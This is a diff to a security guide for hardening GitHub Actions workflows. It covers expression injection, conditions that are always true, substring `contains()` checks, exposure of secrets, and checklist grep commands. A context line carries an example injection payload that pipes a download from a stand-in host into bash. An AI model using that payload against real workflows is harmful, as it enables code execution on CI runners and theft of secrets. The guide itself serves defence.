@@ -185,14 +185,11 @@ while any account can post a comment.
 
 ## 1.5 Script injection in workflow expressions
 
-**Rule: never interpolate attacker-influenced `${{ }}` expressions into `run:`, `script:`
-(github-script), or action inputs that reach a shell.** Expression expansion happens
-*before* the shell sees the text — quoting inside the script does not help.
+**Rule: never interpolate attacker-influenced `${{ }}` expressions into `run:`, `script:` (github-script), or action inputs that reach a shell.**
+Expression expansion happens *before* the shell sees the text — quoting inside the script does not help.
 
-Attacker-controlled contexts include: `github.event.pull_request.title|body`,
-`github.event.issue.title|body`, `github.event.comment.body`, `github.head_ref` (branch
-name!), `github.event.pull_request.head.ref`, commit messages
-(`github.event.head_commit.message`), author names/emails, `github.event.review.body`.
+Attacker-controlled contexts include: `github.event.pull_request.title|body`, `github.event.issue.title|body`, `github.event.comment.body`,
+`github.head_ref` (branch name!), `github.event.pull_request.head.ref`, commit messages (`github.event.head_commit.message`), author names/emails, `github.event.review.body`.
 
 ```yaml
 # BAD — title of `a"; curl evil.sh | bash; echo "` executes
@@ -214,14 +211,17 @@ dangerous line now contains no `${{ }}`, so the YAML reads clean and the linters
 nothing to flag. Say which sink the defence neutralises; where the sink *interprets* the
 value, the fix is not to route attacker-controlled text into it at all.
 
-- In `actions/github-script`, same rule: pass via `env` and read `process.env`, or use
-  the provided `context` object — never template untrusted strings into the JS body.
-- `github.head_ref` in cache keys, artifact names, or `docker tag` arguments also needs
-  sanitization (branch names allow `/`, `$`, quotes).
-- Lint for this: `zizmor` and `actionlint` both flag expression injection — run them in CI
-  over `.github/workflows/`.
-- Severity: injection reachable from a fork PR/issue into a secrets-bearing job = Critical;
-  into a no-secret read-only job = Medium (still grants runner exec + token).
+- In `actions/github-script`, same rule: pass via `env` and read `process.env`, or use the provided `context` object — never template untrusted strings into the JS body.
+- `github.head_ref` in cache keys, artifact names, or `docker tag` arguments also needs sanitization (branch names allow `/`, `$`, quotes).
+- Lint for this: `zizmor` and `actionlint` both flag expression injection — run them in CI over `.github/workflows/` (zizmor also reads `.github/dependabot.yml`).
+- Severity: injection reachable from a fork PR/issue into a secrets-bearing job = Critical; into a no-secret read-only job = Medium (still grants runner exec + token).
+
+### 1.5b A condition that is always true, a membership test that is a substring test
+
+Three shapes read as a guard and are not one; zizmor has an audit for each (docs read 2026-11-22; zizmor 1.32.0 run on each shape, GitHub's runtime not exercised here):
+- **A block scalar around `${{ }}` is always true.** `if: |` or `if: >` keeps a trailing newline, so the value is text with an expression *inside* it — a non-empty string, which is truthy. A deploy step guarded by `if: |` + `${{ github.ref == 'refs/heads/main' }}` runs on every branch (`unsound-condition`; measured: flagged for `|` and `>`, not for the chomped `|-`/`>-`). Write the condition on one line.
+- **`contains()` on a string is a case-insensitive substring test** (GitHub's expression reference): `contains('refs/heads/main refs/heads/dev', github.ref)` is true for a branch named `mai` (`unsound-contains`). Test membership in an array: `contains(fromJSON('["refs/heads/main","refs/heads/dev"]'), github.ref)`.
+- **`toJSON(secrets)` exposes every secret the job can see**, not the one it needs (`overprovisioned-secrets`); reference each by name. Severity follows what the guard or secret protects: a privileged step reachable from any branch is High.
 
 ### 1.5a AI coding agents are CI actors holding your token
 
@@ -482,9 +482,10 @@ durable verdict everywhere ([`rules/11`](11-after-the-gate-fails.md) §4), not j
       execute the jobs locally against a fresh clone (committed state, not the working tree) before trusting any gate it claims; a local harness that skips a step for missing tooling counts that step as not run (§1.11).
 - [ ] Every workflow has a top-level `permissions:` block; no `write-all`; `id-token: write` only in federating jobs; the repo/org default token is read-only (`gh api repos/O/R/actions/permissions/workflow --jq .default_workflow_permissions` prints `read`) and no `repo`/`api`-scoped PAT sits in CI secrets where a GitHub App installation token suffices (§1.1)
 - [ ] No long-lived cloud keys in secrets; OIDC trust policies pin `aud` and an exact `sub` (repo + ref/environment, no wildcards; the numeric `@id` form where the repo carries immutable subject claims); one cloud role per repo × purpose, a shared role spanning prod write = Critical (§1.2)
-- [ ] All third-party actions pinned to full commit SHAs with version comments (§1.3); pins maintained by Renovate/Dependabot with a cooldown (rules/03 §3.7); org actions-allowlist enabled
+- [ ] All third-party actions pinned to full commit SHAs with version comments (§1.3); pins maintained by Renovate/Dependabot with a cooldown (rules/03 §3.7) — `grep -rL 'cooldown:' --include='dependabot.y*ml' .github` is empty, and a file with several `updates:` entries is read by eye, since one cooled entry satisfies the grep; org actions-allowlist enabled
 - [ ] No `pull_request_target`/`workflow_run` job checks out or executes PR head content while secrets/write token are present (§1.4); label gates (if any) re-applied per push and SHA-pinned at approval
 - [ ] No untrusted context (`title`, `body`, `head_ref`, commit message, comment) interpolated into `run:`/`github-script`/shell-reaching inputs — all via `env:` (§1.5); zizmor/actionlint run in CI
+- [ ] **Guards mean what they read as (§1.5b), High where one protects a privileged step:** `grep -rn -A1 -E 'if:[[:space:]]*[|>][+0-9]*[[:space:]]*$' .github/workflows | grep -F '${{'` is empty (a block-scalar `if:` around an expression), `grep -rn -E "contains\([[:space:]]*'[^']*'[[:space:]]*," .github/workflows` is empty (a string `contains()` used as membership), and `grep -rni -E 'tojson\([[:space:]]*secrets[[:space:]]*\)' .github/workflows` is empty
 - [ ] Self-hosted runners: none on public repos; ephemeral; egress monitored; caches not shared across trust boundaries; release/publish/signing jobs restore no build cache (`cache-mode: none`, or no cache step) (§1.6)
 - [ ] Default branch ruleset: PR + review required, stale-approval dismissal, exact required checks, no force-push, applies to admins; release tags protected; signed commits required on protected branches, or their absence (and whether GitHub-signed web-UI commits count) recorded as a threat-model decision (§1.7)
 - [ ] Deploy jobs use `environment:` with required reviewers and branch policy; prod secrets live at environment scope; every deploy/apply workflow sets `concurrency:` with `cancel-in-progress: false` (§1.9, Medium — interleaved applies corrupt state, a cancelled deploy can kill a half-finished migration)
